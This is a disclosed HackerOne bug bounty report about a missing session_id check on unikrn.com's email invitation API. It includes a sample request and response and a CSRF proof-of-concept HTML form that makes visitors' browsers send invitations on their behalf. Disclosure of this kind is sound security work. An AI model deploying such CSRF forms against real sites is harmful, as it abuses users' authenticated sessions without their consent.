# session_id is not being validated at email invitation endpoint

## Report Details
- **Report ID**: 292636
- **URL**: https://hackerone.com/reports/292636
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-11-23T15:01:20.700Z
- **Disclosed**: 2018-04-10T02:20:09.095Z

## Reporter
- **Username**: tolo7010
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: unikrn

## Vulnerability Information
session_id is not being validated at email invitation endpoint

request sample:
``` 
POST /apiv1/inviteemail HTTP/1.1
Host: unikrn.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://unikrn.com/profile
Content-Type: application/json
Application-Version: v3.9.1-1476-g6500a2c
Content-Length: 51
Cookie: ...
Connection: close

{"email":"victim@email.com","session_id":""}
``` 

response sample:
``` 
HTTP/1.1 200 OK
Date: Thu, 23 Nov 2017 14:26:58 GMT
Content-Type: application/json
Content-Length: 150
Connection: close
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 86400
Cache-Control: no-store, no-cache, must-revalidate
CI: M-production C-1 V-1.2.0
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Vary: Origin
X-XSS-Protection: 1; mode=block
Server: cloudflare-nginx
CF-RAY: 3c24ce767b1e340f-HKG

{"error":false,"success":true,"msg":"We invited victim@email.com for you","msg_trans":"We invited victim@email.com for you","data":null}
``` 

CSRF Page:
``` 
<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv1/inviteemail" method="POST">
<input type="hidden" name="email" id="email" value="tololovejoi@hotmail.com">
<input type="hidden" name="session_id" id="session_id" value="">
<input type="submit">
</form>
</body>
</html>
```

## Impact

The victim email get filled on behalf of legitimated users visiting the CSRF page

## Attachments
No attachments
